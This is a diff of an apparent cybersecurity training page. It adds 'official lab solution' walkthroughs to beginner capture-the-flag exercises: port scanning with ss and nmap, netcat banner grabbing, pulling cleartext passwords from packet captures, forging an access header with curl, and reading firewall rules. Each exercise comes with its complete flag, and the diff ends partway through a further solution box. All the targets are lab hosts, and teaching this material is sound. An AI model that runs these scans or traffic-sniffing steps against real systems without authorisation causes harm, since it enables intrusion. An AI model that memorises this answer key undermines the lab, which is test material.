@@ -148,6 +148,74 @@
   }
   .question-box strong { color: #6d28d9; }
 
+  /* Solution Callouts */
+  .solution-box {
+    background: #f0fdf4;
+    border-left: 4px solid #16a34a;
+    color: #14532d;
+    margin-top: 1.5rem;
+    padding: 1.25rem 1.4rem;
+  }
+  .solution-box strong { color: #15803d; }
+  .solution-header {
+    display: flex;
+    align-items: center;
+    gap: 0.6rem;
+    margin-bottom: 0.8rem;
+    border-bottom: 1px solid #bbf7d0;
+    padding-bottom: 0.5rem;
+  }
+  .solution-badge {
+    background: #16a34a;
+    color: #ffffff;
+    font-size: 7.5pt;
+    font-weight: 700;
+    letter-spacing: 0.08em;
+    padding: 2px 7px;
+    border-radius: 4px;
+    text-transform: uppercase;
+  }
+  .solution-box h5 {
+    margin: 1.1rem 0 0.4rem 0;
+    color: #166534;
+    font-size: 10pt;
+    font-weight: 700;
+    text-transform: uppercase;
+    letter-spacing: 0.04em;
+  }
+  .solution-box ol {
+    margin: 0.4rem 0 0.8rem 1.2rem;
+    padding-left: 0;
+  }
+  .solution-box ol li {
+    margin-bottom: 0.45rem;
+    line-height: 1.5;
+  }
+  .cmd-breakdown {
+    background: #ffffff;
+    border: 1px solid #bbf7d0;
+    border-radius: 6px;
+    padding: 0.75rem 1rem;
+    margin-top: 0.4rem;
+    margin-bottom: 0.9rem;
+    color: #1e293b;
+    font-size: 9pt;
+  }
+  .cmd-breakdown strong {
+    color: #0f766e;
+    display: block;
+    margin-bottom: 0.4rem;
+    font-size: 9pt;
+  }
+  .cmd-breakdown ul {
+    margin: 0;
+    padding-left: 1.2rem;
+  }
+  .cmd-breakdown li {
+    margin-bottom: 0.35rem;
+    line-height: 1.45;
+  }
+
   /* Code Formatting */
   pre, code {
     font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
@@ -433,6 +501,49 @@ netstat -tulpn</code></pre>
           </ul>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Enumerate local listening TCP sockets on 127.0.0.1, distinguish operational decoy services from the vault endpoint, and retrieve the flag.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the lab terminal window.</li><li>Enumerate all active listening TCP sockets on the local loopback interface using the Socket Statistics tool: <code>ss -tulpn</code> (or <code>ss -ltn</code>).</li><li>Examine the <code>Local Address:Port</code> column to identify the 4 active TCP ports (distributed across ranges 2000-2999, 3000-3999, 4000-7999, and 8000-8999).</li><li>Connect to each discovered port sequentially using Netcat: <code>nc 127.0.0.1 &lt;PORT&gt;</code>.</li><li>Decoy ports return operational health messages (e.g., <code>keep-metrics: ok</code>, <code>keep-health: alive</code>, <code>nothing to see here</code>). The vault port (between 4000 and 7999) immediately emits the authentic flag.</li><li>Copy the output string and submit it into the terminal prompt.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>ss -tulpn</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>ss</code>: Socket Statistics utility; modern Linux tool querying kernel netlink directly to inspect socket states, replacing deprecated netstat.</li><li><code>-t</code>: TCP filter. Restricts enumeration strictly to Transmission Control Protocol stream sockets.</li><li><code>-u</code>: UDP filter. Displays User Datagram Protocol listening sockets.</li><li><code>-l</code>: Listening only. Displays only sockets in LISTEN state actively waiting for incoming client connections, filtering out outbound established sessions.</li><li><code>-p</code>: Process information. Shows the process name and PID owning each listening socket.</li><li><code>-n</code>: Numeric representation. Prevents ss from performing slow reverse DNS queries or resolving port numbers to service aliases (e.g., outputs 80 instead of http, 22 instead of ssh), displaying exact numeric ports.</li>
+      </ul>
+    </div>
+  
+    <pre><code>nc 127.0.0.1 5678</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>nc</code>: Netcat utility; reads and writes arbitrary data across network connections using TCP or UDP.</li><li><code>127.0.0.1</code>: Target IPv4 loopback address representing the local machine.</li><li><code>5678</code>: The discovered listening TCP port number to connect to.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@signals-ports:~$ ss -ltn
+State   Recv-Q  Send-Q   Local Address:Port   Peer Address:Port
+LISTEN  0       128          127.0.0.1:2451         0.0.0.0:*
+LISTEN  0       128          127.0.0.1:3120         0.0.0.0:*
+LISTEN  0       128          127.0.0.1:5678         0.0.0.0:*
+LISTEN  0       128          127.0.0.1:8290         0.0.0.0:*
+student@signals-ports:~$ nc 127.0.0.1 5678
+BK{p0rt_sc4nn3r_n00b_41a2b4c6d8e0f123}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the extracted token starting with <code>BK{p0rt_sc4nn3r_n00b_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -505,6 +616,55 @@ nmap -sS -p- -T4 10.10.10.5
 nmap -sV -sC -p 80,443,8080 10.10.10.5</code></pre>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Perform an extended TCP port sweep across ports 1-10000 on target host target.keep (127.0.0.2), discover the high-numbered vault port (6000-8999), and extract the flag.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the lab terminal window.</li><li>Target host is defined as <code>target.keep</code> (aliased to <code>127.0.0.2</code>).</li><li>Execute a TCP connect scan across ports 1 to 10,000 using Nmap: <code>nmap -sT -p 1-10000 127.0.0.2</code> (or <code>target.keep</code>). Note: default Nmap scans only probe the top 1,000 common ports and will miss high ports like 7842!</li><li>Note the open ports returned by Nmap (noise services on echo/time/quote, and vault port).</li><li>Connect to the discovered open ports using Netcat: <code>nc 127.0.0.2 &lt;PORT&gt;</code>.</li><li>The vault service responds with: <code>keep-vault: BK{nm4p_sw33p_m4st3r_...}</code>.</li><li>Copy and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>nmap -sT -p 1-10000 127.0.0.2</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>nmap</code>: Network Mapper; industry-standard security tool for network exploration, host discovery, and port enumeration.</li><li><code>-sT</code>: TCP Connect scan. Completes the full 3-way handshake (SYN -> SYN-ACK -> ACK) using the OS connect() system call. Crucial inside unprivileged containers where raw packet socket creation (-sS SYN scan) is restricted.</li><li><code>-p 1-10000</code>: Port range specification. Instructs Nmap to scan all ports from 1 through 10,000. Without this flag, Nmap only scans the top 1,000 common ports and completely overlooks non-standard high ports.</li><li><code>127.0.0.2</code>: Target IP address corresponding to target.keep.</li>
+      </ul>
+    </div>
+  
+    <pre><code>nc 127.0.0.2 7842</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>nc</code>: Netcat client establishing an interactive raw TCP stream with the target.</li><li><code>127.0.0.2</code>: Destination target IP address.</li><li><code>7842</code>: Discovered high-range vault port number.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@signals-scan:~$ nmap -sT -p 1-10000 127.0.0.2
+Starting Nmap 7.93 ( https://nmap.org )
+Nmap scan report for target.keep (127.0.0.2)
+Host is up (0.000080s latency).
+Not shown: 9996 closed tcp ports (conn-refused)
+PORT     STATE SERVICE
+1420/tcp open  unknown
+2850/tcp open  unknown
+4710/tcp open  unknown
+7842/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 0.38 seconds
+student@signals-scan:~$ nc 127.0.0.2 7842
+keep-vault: BK{nm4p_sw33p_m4st3r_9f83a1b2c4e6d789}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the extracted token formatted as <code>BK{nm4p_sw33p_m4st3r_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -565,6 +725,57 @@ curl -I http://192.168.1.50:8080
 # Interactive TCP probe with Telnet:
 telnet 192.168.1.50 25</code></pre>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Connect to an RFC-compliant FTP daemon on 127.0.0.1, extract the exact version number from the initial 220 service greeting banner, and validate it using check <version>.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Read the assignment instructions and port number from <code>README.txt</code> using <code>cat README.txt</code> (or scan listening ports via <code>ss -ltn</code>).</li><li>Connect to the specified port using Netcat: <code>nc 127.0.0.1 &lt;PORT&gt;</code>.</li><li>Observe the server greeting banner: <code>220 KeepFTP 4.7.12 ready</code>.</li><li>Extract the software version number (e.g., <code>4.7.12</code>).</li><li>Execute the in-lab verification utility: <code>check 4.7.12</code>.</li><li>The SUID verification binary validates the version string against <code>/opt/bk/expected</code> and prints the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>cat README.txt</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>cat</code>: Concatenate and print file contents to standard output.</li><li><code>README.txt</code>: Challenge orientation file documenting the listening port on 127.0.0.1.</li>
+      </ul>
+    </div>
+  
+    <pre><code>nc 127.0.0.1 6214</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>nc</code>: Netcat utility connecting to the designated TCP daemon.</li><li><code>127.0.0.1</code>: Localhost IPv4 address.</li><li><code>6214</code>: The listening port specified in README.txt.</li>
+      </ul>
+    </div>
+  
+    <pre><code>check 4.7.12</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>check</code>: SUID verification tool installed at /usr/local/bin/check that checks the software version.</li><li><code>4.7.12</code>: Extracted version parameter from the FTP banner.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@signals-banner:~$ cat README.txt
+A service is listening on 127.0.0.1 port 6214.
+Grab its banner, determine the version, and run: check <version>
+student@signals-banner:~$ nc 127.0.0.1 6214
+220 KeepFTP 4.7.12 ready
+^C
+student@signals-banner:~$ check 4.7.12
+Correct! Flag: BK{b4nn3r_gr4bb1ng_8a1c9e2b4d6f0a13}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the revealed flag starting with <code>BK{b4nn3r_gr4bb1ng_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -628,6 +839,48 @@ tcpdump -i eth0 -nn -w capture.pcap 'tcp port 80 or tcp port 21'
 # Read a PCAP file and filter for string patterns:
 tcpdump -r capture.pcap -A | grep -i "password"</code></pre>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Analyze an unencrypted packet capture file (capture.pcap), isolate cleartext HTTP POST requests, and recover a password containing the flag.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the lab terminal window.</li><li>Review the packet capture summary using TShark: <code>tshark -r capture.pcap</code>.</li><li>Filter for HTTP POST requests transmitting web form submissions: <code>tshark -r capture.pcap -Y 'http.request.method == "POST"' -T fields -e text</code>.</li><li>Alternatively, reassemble the complete TCP conversation stream: <code>tshark -q -r capture.pcap -z follow,tcp,ascii,1</code>.</li><li>Inspect the URL-encoded POST body destined for <code>/login</code> to find <code>username=quartermaster&password=BK{p4ck3t_sn1ff3r_...}</code>.</li><li>Extract the flag from the password field and submit it.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>tshark -r capture.pcap -Y 'http.request.method == "POST"' -T fields -e text</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>tshark</code>: Terminal-based network packet analyzer, the CLI core of Wireshark.</li><li><code>-r capture.pcap</code>: Read mode. Directs TShark to process packets from the specified PCAP file instead of capturing live network traffic.</li><li><code>-Y 'http.request.method == "POST"'</code>: Wireshark display filter. Matches only HTTP packets where the client method is POST (submitting form data).</li><li><code>-T fields</code>: Output format specifier. Formats results as extracted fields rather than standard summary columns.</li><li><code>-e text</code>: Field selector. Extracts the raw reassembled application payload text lines.</li>
+      </ul>
+    </div>
+  
+    <pre><code>tshark -q -r capture.pcap -z follow,tcp,ascii,1</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>-q</code>: Quiet mode. Suppresses normal per-packet output lines, printing only the requested stream report.</li><li><code>-z follow,tcp,ascii,1</code>: Reassembles TCP sequence numbers and displays stream index 1 as bidirectional ASCII text.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@signals-capture:~$ tshark -r capture.pcap -Y 'http.request.method == "POST"' -T fields -e text
+POST /login HTTP/1.1
+Host: shop.keep
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 58
+
+username=quartermaster&password=BK{p4ck3t_sn1ff3r_1a2b3c4d5e6f7a8b}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the password parameter value: <code>BK{p4ck3t_sn1ff3r_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -715,6 +968,45 @@ nslookup -type=TXT secret.internal 127.0.0.1
 dig +trace breachkeep.internal</code></pre>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Query a local DNS server on 127.0.0.1:53 for Resource Record Type TXT to uncover zone hints and extract the flag record.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the lab terminal window.</li><li>Direct a DNS TXT query to the local nameserver at <code>127.0.0.1</code> for the informational record <code>keep.info</code>: <code>dig @127.0.0.1 keep.info TXT +short</code>.</li><li>Read the returned zone clue: <code>"the key is a TXT record named flag.keep"</code>.</li><li>Execute a second DNS query targeting <code>flag.keep</code>: <code>dig @127.0.0.1 flag.keep TXT +short</code>.</li><li>The server returns the flag string enclosed in quotation marks: <code>"BK{dns_z0n3_tr4nsf3r_...}"</code>.</li><li>Strip the surrounding quotes and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>dig @127.0.0.1 keep.info TXT +short</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>dig</code>: Domain Information Groper; flexible CLI utility for interrogating DNS name servers.</li><li><code>@127.0.0.1</code>: Nameserver directive. Queries the local DNS server on 127.0.0.1:53 instead of default system resolvers in /etc/resolv.conf.</li><li><code>keep.info</code>: Domain name being queried.</li><li><code>TXT</code>: DNS Resource Record Type 16 (Text Record), used for SPF, verification tokens, and arbitrary metadata instead of standard IP mapping (A records).</li><li><code>+short</code>: Concise output option. Suppresses DNS headers, question sections, authority records, and query timing stats, returning only the raw answer payload.</li>
+      </ul>
+    </div>
+  
+    <pre><code>dig @127.0.0.1 flag.keep TXT +short</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>flag.keep</code>: The revealed secret domain name identified from the keep.info hint.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@signals-dns:~$ dig @127.0.0.1 keep.info TXT +short
+"the key is a TXT record named flag.keep"
+student@signals-dns:~$ dig @127.0.0.1 flag.keep TXT +short
+"BK{dns_z0n3_tr4nsf3r_a1b2c3d4e5f60718}"</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the token inside the quotes: <code>BK{dns_z0n3_tr4nsf3r_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -783,6 +1075,49 @@ curl -X POST -H "X-Student-Token: Alpha9" -d '{"action":"unlock"}' http://127.0.
 curl -I http://breachkeep.internal/</code></pre>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Audit an internal HTTP web server on 127.0.0.1:80, analyze response headers and status codes, and forge the X-Keep-Access header to unlock /vault.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the lab terminal window.</li><li>Send an initial GET request to the web root including response headers: <code>curl -i http://127.0.0.1/</code>.</li><li>The response hints at a restricted endpoint at <code>/vault</code>.</li><li>Request the vault endpoint: <code>curl -i http://127.0.0.1/vault</code>.</li><li>Observe the <code>403 Forbidden</code> response with the body: <code>forbidden: this endpoint needs the header  X-Keep-Access: open</code>.</li><li>Repeat the request supplying the required HTTP header: <code>curl -s -H "X-Keep-Access: open" http://127.0.0.1/vault</code>.</li><li>The server returns status <code>200 OK</code> with: <code>vault open. key: BK{h34d3rs_4nd_m3th0ds_...}</code>.</li><li>Copy and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>curl -i http://127.0.0.1/vault</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>curl</code>: Client URL command-line tool for network data transfer.</li><li><code>-i</code>: Include headers. Tells curl to print HTTP response status line and headers (e.g., HTTP/1.1 403 Forbidden, Content-Type) directly above the response body.</li><li><code>http://127.0.0.1/vault</code>: Target endpoint URL on localhost port 80.</li>
+      </ul>
+    </div>
+  
+    <pre><code>curl -s -H "X-Keep-Access: open" http://127.0.0.1/vault</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>-s</code>: Silent mode. Hides download progress meter and non-fatal error messages.</li><li><code>-H "X-Keep-Access: open"</code>: Custom header flag. Injects an extra HTTP request header into the outbound request.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@signals-http:~$ curl -i http://127.0.0.1/vault
+HTTP/1.0 403 Forbidden
+Content-Type: text/plain; charset=utf-8
+Content-Length: 58
+
+forbidden: this endpoint needs the header  X-Keep-Access: open
+student@signals-http:~$ curl -s -H "X-Keep-Access: open" http://127.0.0.1/vault
+vault open. key: BK{h34d3rs_4nd_m3th0ds_0f1e2d3c4b5a6978}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the extracted key: <code>BK{h34d3rs_4nd_m3th0ds_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -842,6 +1177,48 @@ echo -e "GET / HTTP/1.0\r\n\r\n" | nc -vn 127.0.0.1 9000
 # Step 3: Run Nmap service version detection to match against 10,000+ protocol probes:
 nmap -sV --version-all -p 9000 127.0.0.1</code></pre>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Investigate a multi-protocol capture (traffic.pcap), identify which legacy application protocol exposes authentication credentials in cleartext, and submit its lowercase name to check.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the lab terminal window.</li><li>Inspect packet summary in <code>traffic.pcap</code> using TShark: <code>tshark -r traffic.pcap</code>.</li><li>Filter for authentication exchanges across HTTP, SMTP, and FTP: <code>tshark -r traffic.pcap -Y 'ftp.request.command == "PASS" || ftp'</code>.</li><li>Notice that FTP (Port 21) transmits <code>USER quartermaster</code> followed by cleartext command <code>PASS s3cr3t-stores</code>.</li><li>Identify the insecure protocol name as <code>ftp</code>.</li><li>Validate your answer by executing the verification utility: <code>check ftp</code>.</li><li>Receive the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>tshark -r traffic.pcap -Y 'ftp.request.command == "PASS" || ftp'</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>tshark</code>: Network protocol analyzer CLI.</li><li><code>-r traffic.pcap</code>: Read packets from traffic.pcap.</li><li><code>-Y 'ftp.request.command == "PASS" || ftp'</code>: Display filter matching FTP authentication requests (RFC 959 password commands).</li>
+      </ul>
+    </div>
+  
+    <pre><code>check ftp</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>check</code>: In-container grading utility comparing submitted protocol name against expected answer in /opt/bk/expected.</li><li><code>ftp</code>: Identified insecure protocol name (File Transfer Protocol).</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@signals-proto:~$ tshark -r traffic.pcap -Y 'ftp'
+   12   1.024510     10.0.0.50 -> 10.0.0.1      FTP 72 Request: USER quartermaster
+   14   1.031204     10.0.0.1  -> 10.0.0.50     FTP 78 Response: 331 Password required for quartermaster
+   16   1.045091     10.0.0.50 -> 10.0.0.1      FTP 75 Request: PASS s3cr3t-stores
+   18   1.052814     10.0.0.1  -> 10.0.0.50     FTP 68 Response: 230 User logged in.
+student@signals-proto:~$ check ftp
+Correct protocol identified! Flag: BK{pr0t0c0l_4n4lys1s_9c8b7a6f5e4d3c21}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the flag starting with <code>BK{pr0t0c0l_4n4lys1s_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -910,6 +1287,55 @@ sudo ufw status verbose
 sudo iptables -A INPUT -p tcp -s 192.168.1.0/24 --dport 22 -j ACCEPT</code></pre>
         </div>
 
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Audit Linux iptables packet filtering rules in /etc/keep/rules.v4, determine the single inbound TCP port allowed through an otherwise default-deny firewall, and submit the port number.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the lab terminal window.</li><li>Read the saved firewall ruleset configuration: <code>cat /etc/keep/rules.v4</code>.</li><li>Observe the default drop policy: <code>:INPUT DROP [0:0]</code> (all inbound traffic is discarded unless an explicit ACCEPT rule matches).</li><li>Filter for inbound ACCEPT rules with destination ports: <code>grep -E "INPUT.*ACCEPT" /etc/keep/rules.v4</code>.</li><li>Identify the permitted external TCP port rule: <code>-A INPUT -p tcp --dport &lt;PORT&gt; -j ACCEPT</code> (e.g., port <code>38421</code>).</li><li>Submit the port number to the verification tool: <code>check 38421</code>.</li><li>Receive the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>cat /etc/keep/rules.v4</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>cat</code>: Prints the complete iptables ruleset file.</li><li><code>/etc/keep/rules.v4</code>: Path to the persistent iptables-restore configuration.</li>
+      </ul>
+    </div>
+  
+    <pre><code>grep -E "INPUT.*ACCEPT" /etc/keep/rules.v4</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>grep</code>: Global regular expression print utility.</li><li><code>-E</code>: Extended Regular Expressions. Matches lines containing INPUT followed by ACCEPT.</li>
+      </ul>
+    </div>
+  
+    <pre><code>check 38421</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>check</code>: SUID verification command.</li><li><code>38421</code>: The discovered allowed destination port number.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@signals-firewall:~$ grep -E "INPUT.*ACCEPT" /etc/keep/rules.v4
+-A INPUT -i lo -j ACCEPT
+-A INPUT -m state --state RELATED,ESTABLISHED -j ACCEPT
+-A INPUT -p tcp -m tcp --dport 38421 -j ACCEPT
+student@signals-firewall:~$ check 38421
+Firewall audit verified! Flag: BK{f1r3w4ll_byp4ss_r0cks_7e6d5c4b3a210f98}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the revealed token: <code>BK{f1r3w4ll_byp4ss_r0cks_...}</code>.</p>
+  </div>
+
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
     
@@ -966,6 +1392,59 @@ tshark -r incident.pcap -Y 'dns.flags.response == 0' -T fields -e dns.qry.name |
 # Carve files transferred over HTTP using tcpflow:
 tcpflow -r incident.pcap -o ./extracted_streams/</code></pre>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
+      <strong>Step-by-Step Solution & Flag Capture Walkthrough</strong>
+    </div>
+    <p><strong>Mission Objective:</strong> Carve and reassemble a TCP conversation from transfer.pcap, identify an obfuscated Base64 HTTP response body, decode it via terminal, and extract the flag.</p>
+
+    <h5>1. Step-by-Step Procedure:</h5>
+    <ol>
+      <li>Open the lab terminal window.</li><li>Reassemble the primary TCP stream in <code>transfer.pcap</code>: <code>tshark -q -r transfer.pcap -z follow,tcp,ascii,0</code>.</li><li>Notice the HTTP response payload containing <code>file: backup.b64</code> followed by a Base64-encoded string (e.g. <code>cmVjb3ZlcmVkLWZpbGUKa2V5OiBCS3t3MXIzc2g0cmtfcGNhcF9kMWdnM3JfNDFhMmI0YzZkOGUwZjEyM30K</code>).</li><li>Copy the Base64 string.</li><li>Decode the string using the command line: <code>echo "&lt;BASE64_STRING&gt;" | base64 -d</code>.</li><li>The decoded output reveals: <code>recovered-file\nkey: BK{w1r3sh4rk_pcap_d1gg3r_...}</code>.</li><li>Copy and submit the flag.</li>
+    </ol>
+
+    <h5>2. Commands to Execute & Flags Breakdown:</h5>
+    
+    <pre><code>tshark -q -r transfer.pcap -z follow,tcp,ascii,0</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>tshark</code>: Network packet analysis CLI.</li><li><code>-q</code>: Quiet mode; suppresses frame-by-frame listings.</li><li><code>-r transfer.pcap</code>: Input PCAP capture file.</li><li><code>-z follow,tcp,ascii,0</code>: Follows TCP stream 0 and displays the reassembled bidirectional conversation in ASCII.</li>
+      </ul>
+    </div>
+  
+    <pre><code>echo "cmVjb3ZlcmVkLWZpbGUKa2V5OiBCS3t3MXIzc2g0cmtfcGNhcF9kMWdnM3JfNDFhMmI0YzZkOGUwZjEyM30K" | base64 -d</code></pre>
+    <div class="cmd-breakdown">
+      <strong>Command & Parameter Breakdown:</strong>
+      <ul>
+        <li><code>echo</code>: Prints the Base64-encoded string.</li><li><code>|</code>: Pipe operator; redirects echo output to the standard input of base64.</li><li><code>base64 -d</code>: Decode flag (-d or --decode). Converts Base64 data back to original plaintext.</li>
+      </ul>
+    </div>
+  
+
+    <h5>3. Expected Output & Flag Verification:</h5>
+    <pre><code>student@signals-pcap:~$ tshark -q -r transfer.pcap -z follow,tcp,ascii,0
+===================================================================
+Follow: tcp,ascii
+Filter: tcp.stream eq 0
+Node 0: 10.0.0.50:49152
+Node 1: 10.0.0.9:80
+GET /backup HTTP/1.1
+Host: internal.keep
+
+HTTP/1.1 200 OK
+Content-Type: text/plain
+
+file: backup.b64
+cmVjb3ZlcmVkLWZpbGUKa2V5OiBCS3t3MXIzc2g0cmtfcGNhcF9kMWdnM3JfNDFhMmI0YzZkOGUwZjEyM30K
+===================================================================
+student@signals-pcap:~$ echo "cmVjb3ZlcmVkLWZpbGUKa2V5OiBCS3t3MXIzc2g0cmtfcGNhcF9kMWdnM3JfNDFhMmI0YzZkOGUwZjEyM30K" | base64 -d
+recovered-file
+key: BK{w1r3sh4rk_pcap_d1gg3r_41a2b4c6d8e0f123}</code></pre>
+    <p><strong>Flag Submission:</strong> Submit the extracted key starting with <code>BK{w1r3sh4rk_pcap_d1gg3r_...}</code>.</p>
+  </div>
 
   <div class="callout defense-rule">
     <strong>Defensive Engineering & Root-Cause Remediation:</strong><br>
@@ -1027,6 +1506,57 @@ ssh -D 1080 -N -f cadet@192.168.1.50
 # Scan the internal private subnet through the proxy:
 proxychains nmap -sT -Pn 10.0.5.0/24</code></pre>
         </div>
+
+  <div class="callout solution-box">
+    <div class="solution-header">
+      <span class="solution-badge">OFFICIAL LAB SOLUTION</span>
